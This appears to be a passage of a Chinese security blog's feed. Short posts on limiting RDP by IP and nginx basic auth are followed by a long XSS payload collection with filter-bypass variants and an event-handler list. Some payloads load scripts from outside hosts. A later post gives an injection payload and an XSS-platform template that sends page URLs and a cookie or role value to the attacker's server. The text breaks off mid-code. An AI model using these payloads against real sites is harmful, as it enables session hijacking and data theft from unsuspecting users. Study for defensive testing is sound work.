        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>指定ip访问远程桌面</title>
      <link href="/2025/03/11/%E6%8C%87%E5%AE%9Aip%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/"/>
      <url>/2025/03/11/%E6%8C%87%E5%AE%9Aip%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="开启防火墙"><a href="#开启防火墙" class="headerlink" title="开启防火墙"></a>开启防火墙</h2><p>打开控制面板（control命令）——&gt;Windows防火墙——&gt;启用和关闭防火墙），勾选启用防火墙</p><p><img src="/images/%E6%8C%87%E5%AE%9Aip%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2.assets/image-20250311164802660.png" alt="image-20250311164802660"></p><p><img src="/images/%E6%8C%87%E5%AE%9Aip%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2.assets/image-20250311164817626.png" alt="image-20250311164817626"></p><h2 id="高级设置"><a href="#高级设置" class="headerlink" title="高级设置"></a>高级设置</h2><p><img src="/images/%E6%8C%87%E5%AE%9Aip%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2.assets/image-20250311164841516.png" alt="image-20250311164841516"></p><h3 id="找到入站规则远程桌面（TCP-In）"><a href="#找到入站规则远程桌面（TCP-In）" class="headerlink" title="找到入站规则远程桌面（TCP-In）"></a>找到入站规则远程桌面（TCP-In）</h3><p><img src="/images/%E6%8C%87%E5%AE%9Aip%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2.assets/image-20250311164904389.png" alt="image-20250311164904389"></p><h3 id="属性确保是远程桌面端口（默认3389）"><a href="#属性确保是远程桌面端口（默认3389）" class="headerlink" title="属性确保是远程桌面端口（默认3389）"></a>属性确保是远程桌面端口（默认3389）</h3><p><img src="/images/%E6%8C%87%E5%AE%9Aip%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2.assets/image-20250311164924667.png" alt="image-20250311164924667"></p><h3 id="作用域添加远程的IP（可以多个）"><a href="#作用域添加远程的IP（可以多个）" class="headerlink" title="作用域添加远程的IP（可以多个）"></a>作用域添加远程的IP（可以多个）</h3><p><img src="/images/%E6%8C%87%E5%AE%9Aip%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2.assets/image-20250311164944065.png" alt="image-20250311164944065"></p><h3 id="确保是启用状态即可"><a href="#确保是启用状态即可" class="headerlink" title="确保是启用状态即可"></a>确保是启用状态即可</h3><p><img src="/images/%E6%8C%87%E5%AE%9Aip%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2.assets/image-20250311165001692.png" alt="image-20250311165001692"></p>]]></content>
      
      
      <categories>
          
          <category> 安全加固 </category>
          
          <category> 未授权访问 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全加固 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP认证</title>
      <link href="/2025/03/10/HTTP%E8%AE%A4%E8%AF%81-nginx/"/>
      <url>/2025/03/10/HTTP%E8%AE%A4%E8%AF%81-nginx/</url>
      
        <content type="html"><![CDATA[<h2 id="在线生成密码："><a href="#在线生成密码：" class="headerlink" title="在线生成密码："></a>在线生成密码：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://tool.oschina.net/htpasswd</span><br></pre></td></tr></table></figure><h2 id="密钥文件1-txt"><a href="#密钥文件1-txt" class="headerlink" title="密钥文件1.txt:"></a>密钥文件1.txt:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test:&#123;SHA&#125;zuk8FWXlOxRmfAPVWy7LMx7WK0E=</span><br></pre></td></tr></table></figure><h2 id="修改nginx配置"><a href="#修改nginx配置" class="headerlink" title="修改nginx配置"></a>修改nginx配置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location /test/ &#123;</span><br><span class="line">auth_basic &quot;secret&quot;; </span><br><span class="line">    auth_basic_user_file /usr/local/nginx/html/1.txt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全加固 </category>
          
          <category> 未授权访问 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全加固 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS-payload</title>
      <link href="/2025/03/10/XSSpayload/"/>
      <url>/2025/03/10/XSSpayload/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS-payload"><a href="#XSS-payload" class="headerlink" title="XSS-payload"></a>XSS-payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg /b + asp.asp /a asp.jpg</span><br><span class="line"></span><br><span class="line">&lt;% #include files=&quot;cus222.aspx.jpg&quot;%&gt;</span><br><span class="line"></span><br><span class="line">\u0027&#x27;单引号</span><br><span class="line">&amp;#34; &amp;quot; &quot; 双引号</span><br><span class="line">&amp;#38; &amp;amp; &amp; &amp;符号</span><br><span class="line">&amp;#60; &amp;lt; \u003c\x3c&lt;  小于号</span><br><span class="line">&amp;#62; &amp;gt; \u003e\x3e&gt;  大于号 </span><br><span class="line">&amp;nbsp;  空格</span><br><span class="line">%0a换行</span><br><span class="line"></span><br><span class="line">unicode转换    %C0%BC %C0%BE -》  &lt; &gt;</span><br><span class="line"></span><br><span class="line">&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;</span><br><span class="line">&amp;lt;script&amp;gt;alert(\&amp;quot;XSS\&amp;quot;)&amp;lt;/script&amp;gt;</span><br><span class="line"></span><br><span class="line">&amp;#60;/script&amp;#62;&amp;#60;script&amp;#62;alert(123)&amp;#60;/script&amp;#62;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;;%0a&#125;%0aconfirm(/xss/);%0a&#123;//</span><br><span class="line">&lt;/h2&gt;&lt;details open=&quot;&quot; ontoggle=alert`xss`&gt;&lt;h2&gt;1</span><br><span class="line">https://s3-us-west-2.amazonaws.com/bxss/fp.js</span><br><span class="line">&#x27;%22()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;alert(9534)&lt;/ScRiPt&gt;</span><br><span class="line">%3Cscript%3Ealert(/xss/)%3C/script%3E</span><br><span class="line">&quot;+alert(/xss/)+&quot;</span><br><span class="line">&#x27;+alert(123)+&#x27;</span><br><span class="line">%27%2balert(0x0006E0)%2b%27</span><br><span class="line">%3Cscript+src%3Dhttps%3A%2F%2Fx.secbox.cn%2FalujrL%3E%3C%2Fscript%3E   修改目标url</span><br><span class="line">&lt;/span&gt;&quot;&quot;&lt;span &lt;script&gt;alert%28%2Fxss%2F%29&lt;%2Fscript&gt;</span><br><span class="line">\%22))&#125;catch(e)&#123;(alert)(/XSS/.source);&#125;//&amp;width=500&amp;height=500</span><br><span class="line"></span><br><span class="line">http://m.cignacmb.com/shop/nianjin&quot;&gt;&lt;script&gt;alert(9841)&lt;/script&gt;.html  测试方法</span><br><span class="line">&lt;/script&gt;&lt;script&gt;prompt(/xss/)&lt;/script&gt;</span><br><span class="line">&#x27;&quot;1&gt;&lt;script&gt;alert(&#x27;/xss&#x27;)&lt;/scRIpT&gt;</span><br><span class="line">&quot;&lt;p&gt;\n    test-xss&amp;nbsp;&lt;input autofocus onfocus=alert(\&quot;xss\&quot;)&gt;\n&lt;/p&gt;&quot;</span><br><span class="line">javascript:alert(/xss/)//</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;ScRiPt &gt;prompt(&#x27;xss&#x27;)&lt;/ScRiPt&gt;</span><br><span class="line">&lt;script&gt;alert(\&quot;XSS2\&quot;)&lt;/script&gt;</span><br><span class="line">&lt;&lt;script&gt;123&lt;/script&gt;script&gt;alert(&quot;XSS4&quot;)&lt;&lt;/script&gt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&lt;iMg src=N onerror=alert(95773)&gt;&lt;</span><br><span class="line">IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</span><br><span class="line">&amp;ltscript&amp;gtprompt(1)&amp;lt/script&amp;gt</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&#x27;vbscript.:msgbox(&quot;XSS&quot;)&#x27;&gt;</span><br><span class="line">&lt;svg/onload=prompt(1);&gt;</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/scr&lt;/script&gt;ipt&gt;</span><br><span class="line">&lt;ScRIpT&lt;ScRIpT&gt;&gt;alert(123);&lt;/ScRIpT&lt;/ScRIpT&gt;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">\u003cimg src=1 onerror=prompt(1)\u003e</span><br><span class="line"></span><br><span class="line">&lt;ScRiPt%20&gt;alert(/xxs/)&lt;/ScRiPt&gt;</span><br><span class="line"></span><br><span class="line">=kdnmewbl&#x27;&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;alert(9967)&lt;/ScRiPt&gt;</span><br><span class="line"></span><br><span class="line">&quot;/&gt;&lt;ScRiPt &gt;alert(&#x27;63&#x27;)&lt;/ScRiPt&gt;&lt;</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;video src=x onerror=alert(1)&gt;</span><br><span class="line">&quot;&gt;&lt;svg/onload=prompt(&quot;xss&quot;);&gt;</span><br><span class="line">&quot;&gt;&lt;svg/onload=windows.open(&quot;http://192.168.1.11/7rIwFL?1567578277&quot;);&gt;</span><br><span class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(“XSS”);&lt;/SCRIPT&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;</span><br><span class="line">&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">\&quot;;alert(&#x27;XSS&#x27;);//</span><br><span class="line"></span><br><span class="line">alert(navigator.userAgent)</span><br><span class="line"></span><br><span class="line">&quot; onclick=alert(1)//</span><br><span class="line">&quot; onclick=&quot;eval(location.hash.substr(1))</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(/4xs3s2c3/)&lt;/script&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;=1</span><br><span class="line">&lt;hr/onmouseover=window.confirm(1)&gt;</span><br><span class="line"></span><br><span class="line">fgth</span><br><span class="line"></span><br><span class="line">&lt;/title&gt;&lt;a href=javascript:prompt(6)&gt;Click&lt;/a&gt;</span><br><span class="line">&lt;/textarea&gt;&lt;ScRiPt&gt;alert(/xss/)&lt;/ScRiPt&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;object src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;</span><br><span class="line">&lt;/textarea&gt;&#x27;&quot;&gt;&lt;script src=http://192.168.1.11/q1opHg?1567669308&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=http://t.cn/AiQudLJP&gt;&lt;/script&gt;</span><br><span class="line">&quot;onmouseover=&#x27;alert`5`&#x27;bad=&quot;</span><br><span class="line">&lt;hr onmouseover=alert(5)&gt;</span><br><span class="line">&lt;hr onclick=prompt(5)&gt;</span><br><span class="line">&lt;iMg src=N onerror=alert(95773)&gt;</span><br><span class="line">https://kss.ksyun.com/zwytest/COUPON/COUPONICON/1568618959716.jsp</span><br><span class="line">&quot;onmouseover=&#x27;alert(123123)&#x27;bad=&quot;</span><br><span class="line">&#x27;onmouseover=&#x27;alert(123123)&#x27;bad=&#x27;</span><br><span class="line">&lt;input+onclick=&#x27;window.confirm(&quot;xss&quot;)&#x27;+value=&quot;</span><br><span class="line">&quot;onmouseover=&quot;[window[&#x27;location&#x27;]=&#x27;\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x2834\x29&#x27;]&quot;</span><br><span class="line">&quot; accesskey=&quot;X&quot; onclick=&quot;alert(/wangan_test/)&quot; &gt;&lt;svg/onload=prompt(&quot;xss&quot;);&gt;&lt;</span><br><span class="line">&quot; accesskey=&quot;X&quot; onclick=&quot;alert(/wangan_test/)&quot;  #shift+alt+x组合键</span><br><span class="line">&lt;img src=x onclick=s=createElement(&#x27;script&#x27;);body.appendChild(s);s.src=&#x27;https://192.168.1.11/15kdrs?1625646246&#x27;;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img/src=q onerror=&#x27;new Function`al\ert\`1\``&#x27;&gt;</span><br><span class="line">&lt;iframe/onload=&#x27;this[&quot;src&quot;]=&quot;javas&amp;Tab;cript:al&quot;+&quot;ert``&quot;&#x27;;&gt;</span><br><span class="line">&lt;input/onauxclick=&quot;[1].map(prompt)&quot;&gt;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">&lt;img src=x onclick=s=createElement(&#x27;script&#x27;);body.appendChild(s);s.src=&#x27;https://192.168.1.11/15kdrs?1625646246&#x27;;&gt;</span><br><span class="line">&lt;hr src=x onclick=s=createElement(&#x27;script&#x27;);body.appendChild(s);s.src=&#x27;https://192.168.1.11/15kdrs?1625646246&#x27;;&gt;</span><br><span class="line">41wq</span><br><span class="line">&lt;img src=x onclick=s=createElement(&#x27;script&#x27;);body.appendChild(s);s.src=&#x27;https://192.168.1.11/15kdrs?1625646246&#x27;;&gt;</span><br><span class="line">&lt;/textarea&gt;&#x27;&quot;&gt;&lt;script src=https://192.168.1.11/15kdrs?1625646246&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=https://192.168.1.11/pcLoId?1615879936&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg/onclick=prompt(1);&gt;</span><br><span class="line">&lt;iMg src=N onclick=prompt(95773)&gt;</span><br><span class="line"></span><br><span class="line">&quot;--&gt;\&quot;时使用%81&quot;#宽字节</span><br><span class="line"></span><br><span class="line">&quot;onmouseover=&quot;eval(/ale/.source+/rt/.source+/(17)/.source)&quot;</span><br><span class="line">%c0%22;alert(1);//aaaaaa   #宽字节</span><br><span class="line">vbscript:msgbox(1)&#x27;</span><br><span class="line">&lt;input autofocus onfocus=&#x27;alert(63)&#x27;</span><br><span class="line">&#x27;&lt;&lt;phonenum&gt;&gt;&#x27;&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;alert(9037)&lt;/ScRiPt&gt;&gt;</span><br><span class="line"></span><br><span class="line">ss=aaa&amp;from=1</span><br><span class="line">ss=aaaa\&quot;+&quot;&amp;from==1;alert(1);function/**/from()&#123;&#125;//&quot;+&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%26解码后为&amp;</span><br><span class="line">keyword=%26callback=eval(St ring.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41));void</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;script src=&#x27;xss.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&quot;);%0aconsole.log(document.cookie);//</span><br><span class="line"></span><br><span class="line">&quot;;confirm(/xss/);//</span><br><span class="line">&quot;&gt;&lt;!--      --&gt;&lt;script&gt;alert(/xss/);&lt;/script&gt;</span><br><span class="line">&quot;;alert(/1111/);&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">javascript:alert(&#x27;xss&#x27;)</span><br><span class="line">javascrip&amp;#116&amp;#58alert(&#x27;xss&#x27;)</span><br><span class="line"></span><br><span class="line">theme=&quot;/&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 8216, 120, 115, 115, 8217, 41)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41));&lt;/script&gt;</span><br><span class="line">&lt;img src=&quot;&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029&quot;&gt;</span><br><span class="line"></span><br><span class="line">%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%78%73%73%22%29%3b%3c%2f%73%63%72%69%70%74%3e</span><br><span class="line"></span><br><span class="line">&lt;a/onmouseover[\x0b]=location=&amp;#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&amp;#039;&gt;rhainfosec</span><br><span class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)&gt; </span><br><span class="line">&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&#x27;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&#x27;\0029&quot;&gt; </span><br><span class="line"></span><br><span class="line">    &lt;!--[if gte IE 4]&gt;</span><br><span class="line"></span><br><span class="line">     &lt;SCRIPT&gt;alert(&#x27;XSS&#x27;);&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">     &lt;![endif]--&gt;</span><br><span class="line"></span><br><span class="line">style=font-family=expression(744+%7BtoString:alert%7D)!</span><br><span class="line"></span><br><span class="line">&lt;!-- 空格被过滤 --&gt;</span><br><span class="line">&lt;img/src=&quot;1&quot;/onerror=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 双写绕过 --&gt;</span><br><span class="line">&lt;iimgmg src=1 oonerrornerror=aimglert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 大小写绕过  --&gt;</span><br><span class="line">&lt;iMg src=1 oNerRor=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 利用eval() --&gt;</span><br><span class="line">&lt;img src=1 onerror=&quot;a=`aler`;b=`t(1)`;eval(a+b);&quot;&gt;</span><br><span class="line">&lt;img src=1 onerror=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 利用location --&gt;</span><br><span class="line">&lt;img src=1 onerror=location=&#x27;javascript:%61%6C%65%72%74%28%31%29&#x27;&gt;</span><br><span class="line">&lt;img src=1 onerror=location=&#x27;javascript:\x61\x6C\x65\x72\x74\x28\x31\x29&#x27;&gt;</span><br><span class="line">&lt;img src=1 onerror=location=&quot;javascr&quot;+&quot;ipt:&quot;+&quot;%61%6C%65%72%74%28%31%29&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 括号被过滤 --&gt;</span><br><span class="line">&lt;img src=1 onerror=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- onerror=被过滤 --&gt;</span><br><span class="line">&lt;img src=1 onerror     =alert(1)&gt;</span><br><span class="line">&lt;img src=1 onerror</span><br><span class="line">=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 属性被转换为大写 --&gt;</span><br><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 编码后被检测 --&gt;</span><br><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">搜索框</span><br><span class="line">&lt;!--&#x27;&quot;&gt;&amp;:</span><br><span class="line">&lt;/h1&gt;&lt;script&gt;alert(&#x27;xss&#x27;);&lt;/script&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/h2&gt;&lt;details open=&quot;&quot; ontoggle=alert`xss`&gt;&lt;h2&gt;1</span><br><span class="line"></span><br><span class="line">如&#x27;\&#x27;变成&#x27;\\&#x27;用%c0\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="各类动作"><a href="#各类动作" class="headerlink" title="各类动作"></a>各类动作</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onabort|onactivate|onafterprint|onafterupdate|onbeforeactivate|onbeforecopy|onbeforecut|onbeforedeactivate|onbeforeeditfocus|onbeforepaste|onbeforeprint|onbeforeunload|onbeforeupdate|onblur|onbounce|oncellchange|onchange|onclick|oncontextmenu|oncontrolselect|oncopy|oncut|ondataavailable|ondatasetchanged|ondatasetcomplete|ondblclick|ondeactivate|ondrag|ondragend|ondragenter|ondragleave|ondragover|ondragstart|ondrop|onerror|onerrorupdate|onfilterchange|onfinish|onfocus|onfocusin|onfocusout|onhelp|onkeydown|onkeypress|onkeyup|onlayoutcomplete|onload|onlosecapture|onmousedown|onmouseenter|onmouseleave|onmousemove|onmouseout|onmouseover|onmouseup|onmousewheel|onmove|onmoveend|onmovestart|onpaste|onpropertychange|onreadystatechange|onreset|onresize|onresizeend|onresizestart|onrowenter|onrowexit|onrowsdelete|onrowsinserted|onscroll|onselect|onselectionchange|onselectstart|onstart|onstop|onsubmit|onunload</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 外网渗透 </category>
          
          <category> 漏洞利用 </category>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS通过js获取url接口内容</title>
      <link href="/2025/03/10/XSS%E9%80%9A%E8%BF%87js%E8%8E%B7%E5%8F%96url%E6%8E%A5%E5%8F%A3%E5%86%85%E5%AE%B9/"/>
      <url>/2025/03/10/XSS%E9%80%9A%E8%BF%87js%E8%8E%B7%E5%8F%96url%E6%8E%A5%E5%8F%A3%E5%86%85%E5%AE%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS服务器配置"><a href="#XSS服务器配置" class="headerlink" title="XSS服务器配置"></a>XSS服务器配置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&quot;&gt;1111&lt;img src=x onmouseover=s=createElement(&#x27;script&#x27;);body.appendChild(s);s.src=&#x27;https://我的站点/myfile/tt.js&#x27;;&gt;&lt;blah=&quot;</span><br></pre></td></tr></table></figure><h2 id="平台定义的默认模板"><a href="#平台定义的默认模板" class="headerlink" title="平台定义的默认模板"></a>平台定义的默认模板</h2><p>其中以下代码需要使用平台定义的默认模板，用于接受返回数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;(new Image()).src=&#x27;https://我的站点/index.php?do=api&amp;id=Q7yYOv&amp;location=&#x27;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;toplocation=&#x27;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;cookie=&#x27;+escape((function()&#123;try&#123;return role&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;opener=&#x27;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#x27;&#x27;&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)());&#125;)();</span><br><span class="line">if(&#x27;&#x27;==1)&#123;keep=new Image();keep.src=&#x27;https://我的站点/index.php?do=keepsession&amp;id=Q7yYOv&amp;url=&#x27;+escape(document.location)+&#x27;&amp;cookie=&#x27;+escape(role)&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="以下保存为js文件"><a href="#以下保存为js文件" class="headerlink" title="以下保存为js文件"></a>以下保存为js文件</h2><p>以下保存为js文件，可去除alert(role)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 